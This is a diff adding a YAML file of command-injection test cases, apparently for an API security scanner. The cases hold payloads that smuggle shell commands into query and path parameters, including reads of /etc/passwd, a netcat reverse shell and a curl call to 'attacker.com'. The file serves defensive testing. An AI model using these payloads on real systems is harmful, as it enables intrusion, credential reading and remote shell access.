@@ -1,0 +1,142 @@
+# CommandInjection - OS Command Injection Tests
+# Reference: CWE-77, OWASP API4-2023
+
+api_version: "1.0"
+category: CommandInjection
+
+test_cases:
+
+  - id: CMD-001
+    name: OS Command Injection via parameter
+    severity: CRITICAL
+    category: CommandInjection
+    cwe_id: CWE-77
+    owasp_ref: API4-2023
+    description: |
+      Test for OS Command Injection by injecting shell commands
+      in application parameters.
+    vuln_type: COMMAND_INJECTION
+    method: GET
+    path: /api/{endpoint}
+    parameters:
+      - name: q
+        type: string
+        location: query
+    payloads:
+      - ";ls"
+      - "|ls"
+      - "&&ls"
+      - "||ls"
+      - "$(ls)"
+      - "`ls`"
+      - ";cat /etc/passwd"
+      - "|nc -e /bin/sh attacker.com 1234"
+    expected_response:
+      check_pattern: "(root|bin|daemon|etc|passwd|shadow)"
+    validation:
+      type: command_output
+      indicators:
+        - "root:"
+        - "bin:"
+        - "/bin/"
+        - "daemon:"
+    remediation: |
+      Use parameterized commands or APIs instead of string concatenation.
+      Validate and sanitize all user input.
+      Use allowlists for permitted values.
+
+  - id: CMD-002
+    name: Blind Command Injection
+    severity: CRITICAL
+    category: CommandInjection
+    cwe_id: CWE-78
+    description: |
+      Test for blind command injection where command output is not
+      returned. Use time-based or network-based detection.
+    vuln_type: COMMAND_INJECTION
+    method: GET
+    path: /api/{endpoint}
+    parameters:
+      - name: q
+        type: string
+        location: query
+    payloads:
+      - ";sleep 10"
+      - "|sleep 10"
+      - "&&sleep 10"
+      - ";ping -c 10 attacker.com"
+      - "|curl https://attacker.com"
+    expected_response:
+      status_code: 200
+    validation:
+      type: time_based
+      time_delay: 5
+      indicators:
+        - response_time_delay
+    remediation: |
+      Use parameterized commands.
+      Validate and sanitize input.
+      Monitor for suspicious network activity.
+
+  - id: CMD-003
+    name: Command Injection in path
+    severity: CRITICAL
+    category: CommandInjection
+    cwe_id: CWE-77
+    description: |
+      Test for command injection in URL path components.
+    vuln_type: COMMAND_INJECTION
+    method: GET
+    path: /api/{filename}
+    parameters:
+      - name: filename
+        type: string
+        location: path
+    payloads:
+      - ";ls"
+      - "test.txt;ls"
+      - "test.txt|ls"
+      - "test.txt&&cat /etc/passwd"
+    expected_response:
+      check_pattern: "(root:|bin:|daemon:)"
+    validation:
+      type: command_output
+      indicators:
+        - "root:"
+        - "etc/passwd"
+    remediation: |
+      Validate path parameters.
+      Use safe APIs for file operations.
+      Never concatenate user input into commands.
+
+  - id: CMD-004
+    name: Command chaining with special characters
+    severity: CRITICAL
+    category: CommandInjection
+    cwe_id: CWE-77
+    description: |
+      Test for command injection using various shell metacharacters.
+    vuln_type: COMMAND_INJECTION
+    method: GET
+    path: /api/{endpoint}
+    parameters:
+      - name: cmd
+        type: string
+        location: query
+    payloads:
+      - "ls%3Bcat%20/etc/passwd"
+      - "ls%7Ccat%20/etc/passwd"
+      - "ls%26%26cat%20/etc/passwd"
+      - "ls%7C%7Ccat%20/etc/passwd"
+      - "$(cat%20/etc/passwd)"
+      - "`cat%20/etc/passwd`"
+    expected_response:
+      check_pattern: "(root:|bin:|daemon:)"
+    validation:
+      type: command_output
+      indicators:
+        - "root:"
+    remediation: |
+      Use parameterized commands.
+      Implement strict input validation.
+      Use allowlists for command names.
